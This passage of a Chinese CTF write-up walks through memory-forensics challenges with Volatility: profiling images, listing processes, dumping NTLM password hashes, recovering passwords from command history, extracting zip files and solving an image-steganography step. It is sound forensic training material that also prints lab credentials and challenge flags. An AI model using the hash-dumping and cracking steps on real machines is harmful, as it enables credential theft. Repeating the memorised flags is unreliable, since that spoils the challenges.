<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(root💀kali)-[/home/kali/volatility2<span class="hljs-number">.6</span>]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>a640404b5c386ab12092587fe19cd02:::<br></code></pre></td></tr></table></figure>
<p>对CTF用户的值，在线网站破解hash<br><img src="https://img-blog.csdnimg.cn/20210601130636808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="NEWSCTF2021-very-ez-dump"><a href="#NEWSCTF2021-very-ez-dump" class="headerlink" title="[NEWSCTF2021] very-ez-dump"></a>[NEWSCTF2021] very-ez-dump</h3><p>查看镜像信息，判断是Win7SP1x64镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw imageinfo                                                    <br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/mem.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf8000403e0a0L<br>          Number of Processors : 2<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff8000403fd00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image date and time : 2021-05-20 13:08:33 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2021-05-20 21:08:33 +0800<br></code></pre></td></tr></table></figure>

<p>列出进程，没看到什么有价值的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 pslist                                 <br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0xfffffa8000cb2040 System                    4      0     91      519 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80016bbb30 smss.exe                256      4      2       30 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80023c7b30 csrss.exe               348    328      9      437      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa80025c3060 wininit.exe             400    328      3       81      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa8001b6f060 csrss.exe               412    392     10      252      1      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa800262e7c0 winlogon.exe            464    392      5      121      1      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800260ab30 services.exe            484    400      9      206      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002674a90 lsass.exe               516    400     10      573      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800267f060 lsm.exe                 524    400     10      142      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002607b30 svchost.exe             640    484     11      359      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa80026af6a0 svchost.exe             720    484      9      292      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002735b30 svchost.exe             792    484     22      498      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa800275a060 svchost.exe             844    484     11      258      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002776960 svchost.exe             892    484     34      969      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027b5b30 svchost.exe            1000    484     17      698      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027dab30 svchost.exe             368    484     15      371      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002858b30 spoolsv.exe            1040    484     12      272      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800286bb30 svchost.exe            1072    484     18      331      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa8002938b30 VGAuthService.         1228    484      3       87      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800297ab30 taskhost.exe           1344    484      9      175      1      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa8002650b30 vmtoolsd.exe           1404    484     11      278      0      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa80029a9b30 dwm.exe                1648    844      5      149      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002a47b30 explorer.exe           1700   1596     44     1219      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002b0eb30 WmiPrvSE.exe           1920    640      9      217      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002af06c0 dllhost.exe            1996    484     13      197      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b93520 vm3dservice.ex          864   1700      2       41      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b3e060 vmtoolsd.exe           1296   1700      9      193      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8000d60060 msdtc.exe               520    484     12      146      0      0 2021-05-20 11:21:58 UTC+0000                                 <br>0xfffffa8002c42440 SearchIndexer.         2208    484     13      600      0      0 2021-05-20 11:22:01 UTC+0000                                 <br>0xfffffa8002d23880 wmpnetwk.exe           2360    484      9      214      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa8002da6b30 svchost.exe            2520    484     15      258      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa800142d400 sppsvc.exe             2500    484      4      150      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa8002d90060 svchost.exe            2408    484     13      343      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa800104ab30 audiodg.exe            2236    792      7      141      0      0 2021-05-20 11:33:37 UTC+0000                                 <br>0xfffffa80010c7060 cmd.exe                2624   1700      1       21      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8000d81550 conhost.exe            1588    412      2       62      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8001044710 SearchProtocol         2580   2208      8      285      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa80010db9b0 SearchFilterHo          316   2208      5       96      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa8001a29680 dllhost.exe            1888    640      6       87      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa8002c78060 dllhost.exe            1252    640      6       83      0      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa800142f060 DumpIt.exe             2864   1700      1       25      1      1 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e2060 conhost.exe            2824    412      2       61      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e6860 dllhost.exe            2696    640      6       69      1      0 2021-05-20 13:08:34 UTC+0000          <br></code></pre></td></tr></table></figure>
<p>看下password的hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 hashdump<br>Volatility Foundation Volatility Framework 2.6<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::<br>mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f:::                                                                                                                                                                      <br></code></pre></td></tr></table></figure>
<p>mumuzi用户的密码破解不出来，继续往下看</p>
<p>查看cmd下执行的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 cmdscan<br>Volatility Foundation Volatility Framework 2.6<br>**************************************************<br>CommandProcess: conhost.exe Pid: 1588<br>CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 13 LastAdded: 12 LastDisplayed: 12<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x109cf0: dir</span><br>Cmd <span class="hljs-comment">#1 @ 0x108290: ipconfig</span><br>Cmd <span class="hljs-comment">#2 @ 0xf8bd0: ipconfig 192.168.26.2</span><br>Cmd <span class="hljs-comment">#3 @ 0x116aa0: ping newsctf.top</span><br>Cmd <span class="hljs-comment">#4 @ 0x1082d0: network</span><br>Cmd <span class="hljs-comment">#5 @ 0x1082f0: net user</span><br>Cmd <span class="hljs-comment">#6 @ 0xf8c50: net user Guest 123456789</span><br>Cmd <span class="hljs-comment">#7 @ 0xf8c90: net user mumuzi (ljmmz)ovo</span><br>Cmd <span class="hljs-comment">#8 @ 0x108350: clear</span><br>Cmd <span class="hljs-comment">#9 @ 0x116a40: if_you_see_it,</span><br>Cmd <span class="hljs-comment">#10 @ 0xf8cd0: you_will_find_the_flag</span><br>Cmd <span class="hljs-comment">#11 @ 0x116ad0: where_is_the_flag?</span><br>Cmd <span class="hljs-comment">#12 @ 0x1178d0: net user Administrator flag_not_here</span><br>Cmd <span class="hljs-comment">#29 @ 0x90158: </span><br>Cmd <span class="hljs-comment">#30 @ 0x10f920: </span><br>**************************************************<br>CommandProcess: conhost.exe Pid: 2824<br>CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated<br>CommandCount: 0 LastAdded: -1 LastDisplayed: -1<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#29 @ 0x2d0158: 5</span><br>Cmd <span class="hljs-comment">#30 @ 0x34f940: 4</span><br></code></pre></td></tr></table></figure>
<p>这条指令net user mumuzi (ljmmz)ovo  ，添加了一个用户mumuzi，密码是(ljmmz)ovo，继续往下看</p>
<p>查看文件，用grep命令查找含flag的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 filescan  | grep flag     <br>Volatility Foundation Volatility Framework 2.6<br>0x000000003e4b2070      2      0 -W-rwd \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br>0x000000003fa56dd0      2      0 RW-rw- \Device\HarddiskVolume1\Users\mumuzi\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk<br></code></pre></td></tr></table></figure>
<p>看到一个flag.zip，dump下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D news               <span class="hljs-comment">#-Q是偏移量，-D是存储的文件夹                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x3e4b2070   None   \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br></code></pre></td></tr></table></figure>
<p>带密码的压缩包，密码就是上面的(ljmmz)ovo，解压得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;ez_di_imp_1t_y0u_like?&#125;<br></code></pre></td></tr></table></figure>
<h3 id="福莱格殿下"><a href="#福莱格殿下" class="headerlink" title="福莱格殿下"></a>福莱格殿下</h3><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43891422/article/details/107852416">https://blog.csdn.net/weixin_43891422/article/details/107852416</a></p>
<p>1.查看内存镜像信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw imageinfo<br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/zy.raw)<br>                      PAE <span class="hljs-built_in">type</span> : PAE<br>                           DTB : 0xaff000L<br>                          KDBG : 0x80546ae0L<br>          Number of Processors : 1<br>     Image Type (Service Pack) : 3<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xffdff000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2020-07-25 16:50:35 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2020-07-26 00:50:35 +0800<br></code></pre></td></tr></table></figure>
<p>镜像系统为WinXPSP2x86</p>
<p>2.获取进程信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  pslist<br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0x821b9830 System                    4      0     58      254 ------      0                                                              <br>0x81c04ba0 smss.exe                536      4      3       19 ------      0 2020-07-25 15:35:26 UTC+0000                                 <br>0x81f59da0 csrss.exe               604    536     11      365      0      0 2020-07-25 15:35:29 UTC+0000                                 <br>0x82007d10 winlogon.exe            632    536     18      451      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x82085560 services.exe            716    632     16      269      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81c944a8 lsass.exe               728    632     22      355      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81f767f0 vmacthlp.exe            904    716      1       25      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x82054988 svchost.exe             916    716     15      189      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x81c1e2a0 svchost.exe             964    716     11      254      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81d57360 svchost.exe            1104    716     55     1147      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bc5458 svchost.exe            1152    716      4       77      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bcf650 svchost.exe            1192    716     14      198      0      0 2020-07-25 15:35:35 UTC+0000                                 <br>0x81d61650 explorer.exe           1596   1540     16      536      0      0 2020-07-25 15:35:39 UTC+0000                                 <br>0x82006da0 spoolsv.exe            1700    716     10      114      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81ffda48 rundll32.exe           1808   1596      4       78      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x8200a7e0 vmtoolsd.exe           1816   1596      7      246      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81d87c10 ctfmon.exe             1824   1596      1       71      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81feabb8 svchost.exe            1784    716      4       84      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81c96790 VGAuthService.e        1996    716      2       60      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81bf0c10 vmtoolsd.exe            176    716      7      267      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81fe0578 wmiprvse.exe           1040    916     13      237      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81c395a8 wscntfy.exe            1188   1104      1       39      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81bb3498 alg.exe                1552    716      5      102      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81d89da0 notepad.exe            1352   1596      2       92      0      0 2020-07-25 15:38:22 UTC+0000                                 <br>0x8206fda0 conime.exe             1832   1320      1       38      0      0 2020-07-25 15:49:44 UTC+0000                                 <br>0x81d89a08 DumpIt.exe              800   1596      1       25      0      0 2020-07-25 16:50:34 UTC+0000   <br></code></pre></td></tr></table></figure>
<p>可疑程序smss.exe</p>
<p>3.提取进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  memdump -p 536 -D ./  <br>Volatility Foundation Volatility Framework 2.6<br>************************************************************************<br>Writing smss.exe [   536] to 536.dmp<br></code></pre></td></tr></table></figure>
<p>4.查看dump信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ strings -e l 536.dmp | grep flag<br>flag.jpg<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.png<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.lnk<br>flag.jpg<br>\flag.jpg*C:\Documents and Settings\Administrator\<br>flag.png<br>flag.jpg<br>flag.lnk<br>notiflag.exe<br>\Documents and Settings\Administrator\Recent\flag.lnk<br>flag.png<br>flag.jpg<br>flag.png<br>flag.png<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.png<br>\flag.jpg<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br> 1\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>flag.png<br>flag.lnk<br>flag.png<br>\flag.jpg.jpg<br>\flag.png<br> 1\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.png<br> 1\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br>flag.jpg<br>usbflags<br>usbflags<br>usbflags<br>usbflags\vvvvpppprrrr<br>usbflags<br></code></pre></td></tr></table></figure>
<p>可疑文件flag.jpg和flag.png</p>
<p>5.获取浏览器浏览历史</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 iehistory<br>Volatility Foundation Volatility Framework 2.6<br></code></pre></td></tr></table></figure>
<p>在大师傅博客里面能看到hint.txt，但我这里啥也没有，继续往下看吧</p>
<p>6.扫描并提取文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep hint<br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002456028      1      0 RW-r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure>
<p>7.使用dumpfiles提取文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002456028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02456028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure>
<p>得到file.None.0x821231b8.dat<br><img src="https://img-blog.csdnimg.cn/20210603204442392.png" alt="在这里插入图片描述"><br>修改后缀为txt，hint提示文件名为fl4g</p>
<p>8.扫描查找fl4g文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep fl4g                 <br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002052028      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure>
<p>9.把fl4g文件dump下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002052028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02052028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure>
<p>修改后缀为zip，解压出来flag.png和flag.jpg</p>
<p>10.LSB双图隐写<br>先用StegSlove打开flag.png，然后点击Analyse-&gt;Image Combiner打开flag.jpg，进行异或会得到二维码<br><img src="https://img-blog.csdnimg.cn/20210603205142989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11.扫码解flag</p>
<p>二维码信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://fanyi.baidu.com/translate?aldtype=16047&amp;query=%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh<span class="hljs-comment">#zh/en/%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7</span><br></code></pre></td></tr></table></figure>
<p>根据读音最终flag为</p>
